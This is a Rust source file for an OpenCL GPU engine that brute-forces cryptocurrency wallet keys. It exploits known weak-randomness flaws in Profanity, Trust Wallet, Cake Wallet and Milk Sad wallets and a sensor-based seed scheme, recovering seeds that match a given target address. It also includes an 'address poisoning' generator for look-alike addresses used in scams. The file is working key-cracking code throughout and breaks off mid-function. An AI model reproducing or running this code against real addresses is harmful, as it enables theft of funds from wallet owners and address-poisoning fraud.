use ocl::{Buffer, MemFlags, Program, ProQue, Queue};
use tracing::{error, info};
use std::path::PathBuf;

use super::gpu_buffers::GpuConstBuffers;

const VECTOR_WIDTH_TO_WARP_MULTIPLIER: usize = 8;

#[derive(Debug, Clone, Copy)]
pub enum KernelProfile {
    Full,
    Minimal,
    MobileSensor,
    CakeWalletHash,
    CakeWalletFull,
    #[deprecated(note = "Use CakeWalletHash and CakeWalletFull separately instead")]
    CakeWallet,
}

impl KernelProfile {
    fn get_files(&self) -> Vec<&'static str> {
        match self {
            KernelProfile::Minimal => vec!["common", "ripemd", "sha2", "sha512"],
            KernelProfile::MobileSensor => vec![
                "common",
                "sha2",
                "mobile_sensor_hash",
                "mobile_sensor_crack",
            ],
            KernelProfile::CakeWalletHash => vec![
                "common",
                "sha2",
                "mnemonic_constants",
                "dart_prng",
                "bip39_helpers",
                "bip39_wordlist_complete",
                "cake_hash",
            ],
            KernelProfile::CakeWalletFull => vec![
                "common",
                "ripemd",
                "sha2",
                "sha512",
                "secp256k1_common",
                "secp256k1_scalar",
                "secp256k1_field",
                "secp256k1_group",
                "secp256k1_prec",
                "secp256k1",
                "address",
                "mnemonic_constants",
                "dart_prng",
                "bip39_helpers",
                "bip39_wordlist_complete",
                "batch_cake_full",
            ],
            #[allow(deprecated)]
            KernelProfile::CakeWallet => vec![
                "common",
                "ripemd",
                "sha2",
                "sha512",
                "secp256k1_common",
                "secp256k1_scalar",
                "secp256k1_field",
                "secp256k1_group",
                "secp256k1_prec",
                "secp256k1",
                "address",
                "mnemonic_constants",
                "dart_prng",
                "bip39_helpers",
                "bip39_wordlist_complete",
                "cake_hash",
                "batch_cake_full",
				"cake_wallet_crack",
            ],
            KernelProfile::Full => vec![
                "common",
                "ripemd",
                "sha2",
                "secp256k1_common",
                "secp256k1_scalar",
                "secp256k1_field",
                "secp256k1_group",
                "secp256k1_prec",
                "secp256k1",
                "address",
                "mnemonic_constants",
                "mt19937",
                "dart_prng",
                "bip39_helpers",
                "bip39_wordlist_complete",
                "bip39_full",
                "batch_address",
                "batch_address_electrum",
                "cake_hash",
                "batch_cake_full",
                "mobile_sensor_hash",
                "base58",
                "address_poisoning",
                "mobile_sensor_crack",
                "keccak256",
                "mt19937_64",
                "batch_profanity",
                "trust_wallet_crack",
				"cake_wallet_crack",
                "milk_sad_crack",
                "test_mt19937",
                "milk_sad_crack_multi30",
                "milk_sad_crack_multi_target",
            ],
        }
    }
}

pub struct GpuSolver {
    pub queue: Queue,
    pub program: Program,
    pub consts: GpuConstBuffers,

    pro_que: ProQue,
    kernel_name: String,

    max_work_group_size: usize,
    preferred_work_group_multiple: usize,
    max_compute_units: u32,
    local_mem_size: u64,
    profile: KernelProfile,
}

impl GpuSolver {
	pub fn compute_keccak256(
    &self,
    messages: &[Vec<u8>],
) -> ocl::Result<Vec<[u8;32]>> {

    let count = messages.len();
    if count == 0 {
        return Ok(Vec::new());
    }

    let stride = 136; // фиксированный single-block
    let msg_len = messages[0].len() as u32;

    let mut flat = vec![0u8; count * stride];

    for (i, msg) in messages.iter().enumerate() {
        flat[i*stride..i*stride+msg.len()]
            .copy_from_slice(msg);
    }

    let buffer_in = Buffer::<u8>::builder()
        .queue(self.pro_que.queue().clone())
        .flags(MemFlags::new().read_only().copy_host_ptr())
        .len(flat.len())
        .copy_host_slice(&flat)
        .build()?;

    let buffer_out = Buffer::<u8>::builder()
        .queue(self.pro_que.queue().clone())
        .flags(MemFlags::new().write_only())
        .len(count * 32)
        .build()?;

    let local = self.calculate_local_work_size(count);
    let global = count.div_ceil(local) * local;

    let kernel = self.pro_que
        .kernel_builder("keccak256_batch")
        .arg(&buffer_in)
        .arg(stride as u32)
        .arg(msg_len)
        .arg(&buffer_out)
        .arg(count as u32)
        .global_work_size(global)
        .local_work_size(local)
        .build()?;

    unsafe { kernel.enq()?; }

    let mut raw = vec![0u8; count*32];
    buffer_out.read(&mut raw).enq()?;

    let mut out = Vec::with_capacity(count);
    for chunk in raw.chunks(32) {
        let mut h = [0u8;32];
        h.copy_from_slice(chunk);
        out.push(h);
    }

    Ok(out)
}
	
    /// Дефолтный конструктор (как ожидают тесты)
    pub fn new() -> ocl::Result<Self> {
        Self::new_with_profile(KernelProfile::Full)
    }

    pub fn new_with_profile(profile: KernelProfile) -> ocl::Result<Self> {
        info!("[GPU] Initializing with profile {:?}", profile);
		let files = profile.get_files();
		let mut source = String::new();

		for f in files {
			let kernel_path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
				.join("cl")
				.join(format!("{}.cl", f));
				
			info!("[GPU] Loading kernel: {}", kernel_path.display());

			let src = std::fs::read_to_string(&kernel_path)
				.map_err(|e| {
					error!("Failed to read OpenCL kernel: {}", kernel_path.display());
					e
				})?;
			
			source.push_str(&src);
			source.push('\n');
		}
		
		if source.is_empty() {
			panic!("OpenCL kernel source is EMPTY");
		}
        let pro_que = ProQue::builder()
            .src(source)
			.dims(1)
            .build()?;
			
		// ВРЕМЕННАЯ ДИАГНОСТИКА — удалить после исправления
		{
			use ocl::enums::{ProgramBuildInfo, ProgramBuildInfoResult};
			let device = pro_que.device();
			match pro_que.program().build_info(device, ProgramBuildInfo::BuildLog) {
				Ok(ProgramBuildInfoResult::BuildLog(log)) if !log.trim().is_empty() => {
					eprintln!("=== OpenCL BUILD LOG ===\n{}\n========================", log);
				}
				_ => {}
			}
		}

        let device = pro_que.device();
        let queue = pro_que.queue().clone();
        let context = pro_que.context().clone();
		let program = pro_que.program().clone();

        let consts = GpuConstBuffers::new(&queue)?;

        use ocl::enums::{DeviceInfo, DeviceInfoResult};

		let max_work_group_size = match device.info(DeviceInfo::MaxWorkGroupSize)? {
			DeviceInfoResult::MaxWorkGroupSize(v) => v as usize,
			_ => 256,
		};

		let max_compute_units = match device.info(DeviceInfo::MaxComputeUnits)? {
			DeviceInfoResult::MaxComputeUnits(v) => v,
			_ => 1,
		};

		let local_mem_size = match device.info(DeviceInfo::LocalMemSize)? {
			DeviceInfoResult::LocalMemSize(v) => v,
			_ => 32 * 1024,
};

		let preferred_work_group_multiple =
			match device.info(DeviceInfo::PreferredVectorWidthInt)? {
				DeviceInfoResult::PreferredVectorWidthInt(v) if v > 0 =>
					(v as usize) * VECTOR_WIDTH_TO_WARP_MULTIPLIER,
				_ => 32,
			};

        Ok(Self {
            queue,
            program,
            consts,
            pro_que,
            kernel_name: "batch_address".to_string(),
            max_work_group_size,
            preferred_work_group_multiple,
            max_compute_units,
            local_mem_size,
            profile,
        })
    }

	fn calculate_local_work_size(&self, global_size: usize) -> usize {
		if global_size == 0 {
			return 1;
    }

    let target = self.preferred_work_group_multiple.max(64);

    if global_size <= target {
        return target.min(self.max_work_group_size);
    }

    let max_aligned =
        (self.max_work_group_size / target) * target;

    max_aligned
        .max(target)
        .min(self.max_work_group_size)
}


    // Calculate optimal batch size based on device compute units
    #[allow(dead_code)]
    fn calculate_optimal_batch_size(&self, _work_per_item: usize) -> usize {
        // Aim for 2-4 work items per compute unit for good occupancy
        let occupancy_factor = 4;
        let optimal_size =
            (self.max_compute_units as usize) * self.max_work_group_size * occupancy_factor;

        // Round to nearest preferred work group multiple
        let rounded = optimal_size.div_ceil(self.preferred_work_group_multiple)
            * self.preferred_work_group_multiple;

        rounded.max(self.preferred_work_group_multiple)
    }

    pub fn compute_batch(
        &self,
        entropies: &[[u8; 16]],
        purpose: u32,
    ) -> ocl::Result<Vec<[u8; 25]>> {
        self.compute_batch_with_kernel(&self.kernel_name, entropies, purpose)
    }

    /// Compute addresses using Electrum seed derivation (with "electrum" salt)
    /// This is specifically for Cake Wallet vulnerability scanning
    pub fn compute_batch_electrum(
        &self,
        entropies: &[[u8; 16]],
        purpose: u32,
    ) -> ocl::Result<Vec<[u8; 25]>> {
        self.compute_batch_with_kernel("batch_address_electrum", entropies, purpose)
    }

    /// Compute addresses using the optimized kernel with local memory
    /// This provides 20-40% performance improvement over the standard batch_address kernel
    /// by using local memory for SHA-256/SHA-512 operations during PBKDF2
    ///
    /// This method automatically calculates the optimal local work size based on
    /// available local memory and falls back to the standard kernel if insufficient
    pub fn compute_batch_optimized(
        &self,
        entropies: &[[u8; 16]],
        purpose: u32,
    ) -> ocl::Result<Vec<[u8; 25]>> {
        // Now that the standard batch_address kernel is highly optimized with
        // PBKDF2 memoization and register pressure reduction, the previous 
        // "local memory" variant is redundant and actually slower on Apple Silicon.
        self.compute_batch(entropies, purpose)
    }

    /// Internal method to compute addresses using a specified kernel
    fn compute_batch_with_kernel(
        &self,
        kernel_name: &str,
        entropies: &[[u8; 16]],
        purpose: u32,
    ) -> ocl::Result<Vec<[u8; 25]>> {
        let batch_size = entropies.len();
        if batch_size == 0 {
            return Ok(Vec::new());
        }

        // Split 128-bit entropy into two 64-bit ulongs for OpenCL
        // GPU reconstructs bytes in big-endian order, so we must send as big-endian
        let mut entropies_hi = Vec::with_capacity(batch_size);
        let mut entropies_lo = Vec::with_capacity(batch_size);

        for ent in entropies {
            // CRITICAL: The OpenCL kernel expects big-endian byte order
            // The kernel unpacks bytes[0..8] from hi and bytes[8..16] from lo
            // See batch_address.cl lines 20-37 for how bytes are extracted
            let hi = u64::from_be_bytes(
                ent[0..8]
                    .try_into()
                    .expect("Entropy should always be 16 bytes"),
            );
            let lo = u64::from_be_bytes(
                ent[8..16]
                    .try_into()
                    .expect("Entropy should always be 16 bytes"),
            );
            entropies_hi.push(hi);
            entropies_lo.push(lo);
        }

        // Use pinned/alloc_host_ptr for faster CPU-GPU transfers
        let buffer_hi = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(batch_size)
            .copy_host_slice(&entropies_hi)
            .build()?;

        let buffer_lo = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(batch_size)
            .copy_host_slice(&entropies_lo)
            .build()?;

        let output_len = batch_size * 25;
        let buffer_out = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(output_len)
            .build()?;

        // Calculate optimal local work size
        let local_work_size = self.calculate_local_work_size(batch_size);
        
        // CRITICAL: Global work size MUST be a multiple of local work size
        let global_work_size = batch_size.div_ceil(local_work_size) * local_work_size;

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_hi)
            .arg(&buffer_lo)
            .arg(&buffer_out)
            .arg(purpose)
            .arg(batch_size as u32)
            .global_work_size(global_work_size)
            .local_work_size(local_work_size)
            .build()?;

        unsafe {
            kernel.enq()?;
        }

        let mut output = vec![0u8; output_len];
        buffer_out.read(&mut output).enq()?;

        let mut results = Vec::with_capacity(batch_size);
        for chunk in output.chunks(25) {
            let mut addr = [0u8; 25];
            addr.copy_from_slice(chunk);
            results.push(addr);
        }

        Ok(results)
    }

    pub fn compute_cake_hash(
        &self,
        timestamps: &[u64],
        target_hashes: &[u8], // Flattened sorted hashes
    ) -> ocl::Result<Vec<u64>> {
        let batch_size = timestamps.len();
        let target_count = target_hashes.len() / 32;

        // Use pinned memory for faster transfers
        let buffer_timestamps = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(batch_size)
            .copy_host_slice(timestamps)
            .build()?;

        // Input buffer: target hashes (read-only, can be cached)
        let buffer_hashes = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(target_hashes.len())
            .copy_host_slice(target_hashes)
            .build()?;

        // Output buffer: results (timestamps)
        // Max 1024 results per batch (unlikely to find many)
        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(max_results)
            .build()?;

        // Output buffer: result count
        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(
                MemFlags::new()
                    .read_write()
                    .alloc_host_ptr()
                    .copy_host_ptr(),
            )
            .len(1)
            .copy_host_slice(&[0u32])
            .build()?;

        // Calculate optimal local work size
        let local_work_size = self.calculate_local_work_size(batch_size);

        let kernel = self
			.pro_que
			.kernel_builder("cake_hash")
			.arg(&buffer_timestamps)
			.arg(&buffer_hashes)
			.arg(target_count as u32)
			.arg(&buffer_results)
			.arg(&buffer_count)
			// 👇 ДОБАВЛЯЕМ local memory
			.arg_local::<u64>(24)
			.global_work_size(batch_size)
			.local_work_size(local_work_size)
			.build()?;

        unsafe {
            kernel.enq()?;
        }

        // Read count
        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = std::cmp::min(count, max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;

            // Return only valid results
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }

    /// Compute SHA‑256 hashes for simulated mobile‑sensor seeds.
    /// Returns a vector of 32‑byte hashes, one per index.
    pub fn compute_mobile_hash(&self, indices: &[u64]) -> ocl::Result<Vec<[u8; 32]>> {
        let count = indices.len();
        if count == 0 {
            return Ok(Vec::new());
        }

        // Input buffer: device indices (with pinned memory)
        let buffer_indices = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(count)
            .copy_host_slice(indices)
            .build()?;

        // Output buffer: hashes (count * 32 bytes, with pinned memory)
        let out_len = count * 32;
        let buffer_out = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(out_len)
            .build()?;

        // Calculate optimal local work size
        let local_work_size = self.calculate_local_work_size(count);

        let kernel = self
            .pro_que
            .kernel_builder("mobile_sensor_hash")
            .arg(&buffer_indices)
            .arg(&buffer_out)
            .arg(count as u32)
            .global_work_size(count)
            .local_work_size(local_work_size)
            .build()?;

        unsafe {
            kernel.enq()?;
        }

        // Read back hashes
        let mut raw = vec![0u8; out_len];
        buffer_out.read(&mut raw).enq()?;

        // Chunk into [u8;32]
        let mut hashes: Vec<[u8; 32]> = Vec::with_capacity(count);
        for chunk in raw.chunks(32) {
            let mut arr = [0u8; 32];
            arr.copy_from_slice(chunk);
            hashes.push(arr);
        }
        Ok(hashes)
    }

    /// Compute Address Poisoning (Vanity Address Generation)
    /// Returns matching private key seeds
    pub fn compute_address_poisoning(
        &self,
        seed_base: u64,
        batch_size: usize,
        target_prefix: &str,
        target_suffix: &str,
    ) -> ocl::Result<Vec<u64>> {
        // Encode prefix/suffix into u64 (max 8 chars)
        let mut prefix_encoded = 0u64;
        for (i, b) in target_prefix.bytes().enumerate().take(8) {
            prefix_encoded |= (b as u64) << (i * 8);
        }

        let mut suffix_encoded = 0u64;
        for (i, b) in target_suffix.bytes().enumerate().take(8) {
            suffix_encoded |= (b as u64) << (i * 8);
        }

        // Output buffers
        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().copy_host_ptr())
            .len(1)
            .copy_host_slice(&[0u32])
            .build()?;

        let kernel = self
            .pro_que
            .kernel_builder("address_poisoning")
            .arg(seed_base)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(target_prefix.len() as u32)
            .arg(target_suffix.len() as u32)
            .arg(prefix_encoded)
            .arg(suffix_encoded)
            .global_work_size(batch_size)
            .build()?;

        unsafe {
            kernel.enq()?;
        }

        // Read count
        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = std::cmp::min(count, max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }

    /// Compute Mobile Sensor Crack
    /// Brute-forces sensor values to find a matching address hash160.
    /// Returns matching GIDs (which map to x,y,z).
    pub fn compute_mobile_crack(&self, target_h160: &[u8; 20]) -> ocl::Result<Vec<u64>> {
        // Pack hash160 into ulongs/uint
        let mut h1 = 0u64;
        let mut h2 = 0u64;
        let mut h3 = 0u32;

        for (i, &byte) in target_h160.iter().enumerate().take(8) {
            h1 |= (byte as u64) << (i * 8);
        }
        for (i, &byte) in target_h160.iter().skip(8).enumerate().take(8) {
            h2 |= (byte as u64) << (i * 8);
        }
        for (i, &byte) in target_h160.iter().skip(16).enumerate().take(4) {
            h3 |= (byte as u32) << (i * 8);
        }

        // Output buffers (with pinned memory for faster results readback)
        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(
                MemFlags::new()
                    .read_write()
                    .alloc_host_ptr()
                    .copy_host_ptr(),
            )
            .len(1)
            .copy_host_slice(&[0u32])
            .build()?;

        // Search space: 201 * 201 * 201 = 8,120,601
        let range: usize = 201 * 201 * 201;
        // Use device-specific local work size
        let local_work_size = self.max_work_group_size.min(256);
        let global_work_size = range.div_ceil(local_work_size) * local_work_size;
        let offset: u64 = 0;

        let kernel = self
            .pro_que
            .kernel_builder("mobile_sensor_crack")
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(h1)
            .arg(h2)
            .arg(h3)
            .arg(offset)
            .global_work_size(global_work_size)
            .local_work_size(local_work_size)
            .build()?;

        unsafe {
            kernel.enq()?;
        }

        // Read count
        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = std::cmp::min(count, max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }
    /// Profanity Vulnerability Scanner - Brute-force 32-bit MT19937-64 seeds
    /// Returns list of matching seeds that generate the target Ethereum address
    pub fn compute_profanity(
        &self,
        total_seeds: u64,
        target_addr: &[u8],
    ) -> ocl::Result<Vec<u64>> {
        let kernel_name = "batch_profanity";
        
        // Ensure we have exactly 20 bytes for Ethereum address
        if target_addr.len() != 20 {
            return Err(ocl::Error::from(
                format!("Invalid address length: {} (expected 20)", target_addr.len())
            ));
        }
        
        // CRITICAL: Profanity only used 32-bit seeds (0 to 2^32-1)
        let max_profanity_seed = 4_294_967_296u64; // 2^32
        let actual_total = total_seeds.min(max_profanity_seed);
        
        // Batch size: process in chunks to avoid GPU timeout
        let batch_size = 100_000_000u64; // 100M seeds per batch
        let max_results = 1024;

        // Allocate result buffers (reused across batches)
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;

        // Pack target address into 3 parts for efficient GPU comparison
        // Address is 20 bytes: 8 + 8 + 4 bytes
        let mut target_part1: u64 = 0;
        let mut target_part2: u64 = 0;
        let mut target_part3: u32 = 0;

        // Little-endian packing
        for i in 0..8 {
            target_part1 |= (target_addr[i] as u64) << (i * 8);
        }
        for i in 0..8 {
            target_part2 |= (target_addr[8 + i] as u64) << (i * 8);
        }
        for i in 0..4 {
            target_part3 |= (target_addr[16 + i] as u32) << (i * 8);
        }

        info!("[GPU] Target packed: {:016x} {:016x} {:08x}", 
              target_part1, target_part2, target_part3);

        let mut all_results = Vec::new();
        let mut batch_start = 0u64;

        // Process in batches
        while batch_start < actual_total {
            let batch_end = (batch_start + batch_size).min(actual_total);
            let batch_count = (batch_end - batch_start) as usize;

            // Reset result counter for this batch
            let zero_vec = vec![0u32];
            buffer_count.write(&zero_vec[..]).enq()?;

            // Build kernel for this batch
            let kernel = self
                .pro_que
                .kernel_builder(kernel_name)
                .arg(&buffer_results)
                .arg(&buffer_count)
                .arg(target_part1)
                .arg(target_part2)
                .arg(target_part3)
                .arg(batch_start) // offset parameter
                .build()?;

            // Calculate work sizes
            let local_work_size = 128;
            let global_work_size = batch_count.div_ceil(local_work_size) * local_work_size;

            info!(
                "[GPU] Batch: {}-{} ({} seeds, global={}, local={})",
                batch_start,
                batch_end,
                batch_count,
                global_work_size,
                local_work_size
            );

            // Execute kernel
            unsafe {
                kernel
                    .cmd()
                    .global_work_size(global_work_size)
                    .local_work_size(local_work_size)
                    .enq()?;
            }

            // Read results
            let mut count_vec = vec![0u32; 1];
            buffer_count.read(&mut count_vec).enq()?;
            let count = count_vec[0] as usize;

            if count > 0 {
                info!("[GPU] Found {} match(es) in this batch!", count);
                let read_count = count.min(max_results);
                let mut results = vec![0u64; max_results];
                buffer_results.read(&mut results).enq()?;
                
                for &seed in results.iter().take(read_count) {
                    all_results.push(seed);
                }
            }

            batch_start = batch_end;
        }

        Ok(all_results)
    }

    pub fn compute_trust_wallet_crack(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        target_h160: &[u8; 20],
    ) -> ocl::Result<Vec<u64>> {
        let kernel_name = "trust_wallet_crack";

        // CRITICAL: Must match hardcoded buffer size in cl/trust_wallet_crack.cl:66
        // If kernel buffer check changes, update this value to match
        const MAX_RESULTS: usize = 1024;
        let max_results = MAX_RESULTS;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;

        buffer_count.write(&vec![0u32]).enq()?;

        // Parse target Hash160
        let mut h1: u64 = 0;
        let mut h2: u64 = 0;
        let mut h3: u32 = 0;

        for (i, &byte) in target_h160.iter().enumerate().take(8) {
            h1 |= (byte as u64) << (i * 8);
        }
        for (i, &byte) in target_h160.iter().skip(8).enumerate().take(8) {
            h2 |= (byte as u64) << (i * 8);
        }
        for (i, &byte) in target_h160.iter().skip(16).enumerate().take(4) {
            h3 |= (byte as u32) << (i * 8);
        }

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(h1)
            .arg(h2)
            .arg(h3)
            .arg(start_timestamp) // Offset - CRITICAL: must be start_timestamp, not 0
            .build()?;

        let range = (end_timestamp - start_timestamp) as usize;
        // Use device-optimized work group size
        let local_work_size = self.max_work_group_size.min(256);
        // Round up to nearest multiple of local_work_size
        let global_work_size = range.div_ceil(local_work_size) * local_work_size;

        unsafe {
            if let Err(e) = kernel
                .cmd()
                .global_work_size(global_work_size)
                .local_work_size(local_work_size)
                .enq()
            {
                error!(
                    "Kernel execution failed: {} (kernel: {}, global_work_size: {}, local_work_size: {}, range: {}-{})",
                    e, kernel_name, global_work_size, local_work_size, start_timestamp, end_timestamp
                );
                return Err(e);
            }
        }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = std::cmp::min(count, max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }


    /// Compute Cake Wallet Crack — Timestamp mode (correct keyspace).
    ///
    /// Iterates `count` consecutive millisecond timestamps starting from
    /// `start_ms`. Each timestamp is converted to microseconds inside the
    /// kernel (`seed = ts_ms * 1000`) because Dart received
    /// `DateTime.now().microsecondsSinceEpoch`. Checks 40 P2WPKH addresses
    /// per timestamp (m/0'/{0,1}/{0..19}).
    ///
    /// Returns `Vec<(ts_ms, change, addr_idx)>`.
    pub fn compute_cake_wallet_crack_ms(
        &self,
        start_ms: u64,
        count: u32,
        target_h160: &[u8; 20],
    ) -> ocl::Result<Vec<(u64, u32, u32)>> {
        let kernel_name = "cake_wallet_crack_ms";

        let max_hits = 1024usize;
        // Each hit: 3 × u64 (ts_ms, change, addr_idx)
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_hits * 3)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;
        buffer_count.write(&vec![0u32]).enq()?;

        // Pack Hash160 little-endian into (u64, u64, u32)
        let mut h1 = 0u64;
        let mut h2 = 0u64;
        let mut h3 = 0u32;
        for i in 0..8  { h1 |= (target_h160[i]    as u64) << (i * 8); }
        for i in 0..8  { h2 |= (target_h160[i + 8] as u64) << (i * 8); }
        for i in 0..4  { h3 |= (target_h160[i + 16] as u32) << (i * 8); }

        let local_work_size = 128usize;
        let global_work_size = (count as usize).div_ceil(local_work_size) * local_work_size;

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(h1)
            .arg(h2)
            .arg(h3)
            .arg(start_ms)   // u64 — GPU adds get_global_id(0) and multiplies by 1000
            .global_work_size(global_work_size)
            .local_work_size(local_work_size)
            .build()?;

        unsafe { kernel.enq()?; }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let hit_count = (count_vec[0] as usize).min(max_hits);

        if hit_count == 0 {
            return Ok(Vec::new());
        }

        let mut raw = vec![0u64; max_hits * 3];
        buffer_results.read(&mut raw).enq()?;

        let mut out = Vec::with_capacity(hit_count);
        for i in 0..hit_count {
            let ts_ms   = raw[i * 3];
            let change  = raw[i * 3 + 1] as u32;
            let addr_idx = raw[i * 3 + 2] as u32;
            out.push((ts_ms, change, addr_idx));
        }
        Ok(out)
    }

    /// Compute Cake Wallet Full Batch
    /// Takes a list of verified seed indices.
    /// Derives 40 addresses for each seed: change 0/1 * index 0-19.
    /// Returns: Flattened vector of 33-byte Compressed Public Keys (count * 40 items).
    pub fn compute_cake_batch_full(&self, seed_indices: &[u32]) -> ocl::Result<Vec<[u8; 33]>> {
        let kernel_name = "batch_cake_full";
        let batch_size = seed_indices.len();
        if batch_size == 0 {
            return Ok(Vec::new());
        }

        // Input buffer: Seed indices
        let buffer_seeds = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().copy_host_ptr())
            .len(batch_size)
            .copy_host_slice(seed_indices)
            .build()?;

        // Output buffer: 40 keys per seed * 33 bytes per key
        // Using u8 buffer for direct byte access
        let total_output_bytes = batch_size * 40 * 33;
        let buffer_results = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(total_output_bytes)
            .build()?;

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_seeds)
            .arg(&buffer_results)
            .arg(batch_size as u32)
            .global_work_size(batch_size)
            .build()?;

        unsafe {
            kernel.enq()?;
        }

        // Read results
        let mut results_bytes = vec![0u8; total_output_bytes];
        buffer_results.read(&mut results_bytes).enq()?;

        // Convert flat bytes to [u8; 33]
        let mut keys = Vec::with_capacity(batch_size * 40);
        for chunk in results_bytes.chunks_exact(33) {
            let mut k = [0u8; 33];
            k.copy_from_slice(chunk);
            keys.push(k);
        }

        Ok(keys)
    }

    pub fn compute_milk_sad_crack(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        target_h160: &[u8; 20],
        purpose: u32,
        entropy_bits: u32,  // 128, 192, or 256
    ) -> ocl::Result<Vec<u64>> {
        let kernel_name = match entropy_bits {
            192 => "milk_sad_crack_192",
            256 => "milk_sad_crack_256",
            _   => "milk_sad_crack",   // default: 128-bit
        };

        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;

        buffer_count.write(&vec![0u32]).enq()?;

        // Parse target Hash160
        let mut h1: u64 = 0;
        let mut h2: u64 = 0;
        let mut h3: u32 = 0;

        for (i, &byte) in target_h160.iter().enumerate().take(8) {
            h1 |= (byte as u64) << (i * 8);
        }
        for (i, &byte) in target_h160.iter().skip(8).enumerate().take(8) {
            h2 |= (byte as u64) << (i * 8);
        }
        for (i, &byte) in target_h160.iter().skip(16).enumerate().take(4) {
            h3 |= (byte as u32) << (i * 8);
        }

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(h1)
            .arg(h2)
            .arg(h3)
            .arg(purpose)
            .arg(start_timestamp) // Offset - CRITICAL: must be start_timestamp, not 0
            .build()?;

        let range = (end_timestamp - start_timestamp) as usize;
        // Use device-optimized work group size
        let local_work_size = self.max_work_group_size.min(256);
        // Round up to nearest multiple of local_work_size
        let global_work_size = range.div_ceil(local_work_size) * local_work_size;

        unsafe {
            kernel
                .cmd()
                .global_work_size(global_work_size)
                .local_work_size(local_work_size)
                .enq()?;
        }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
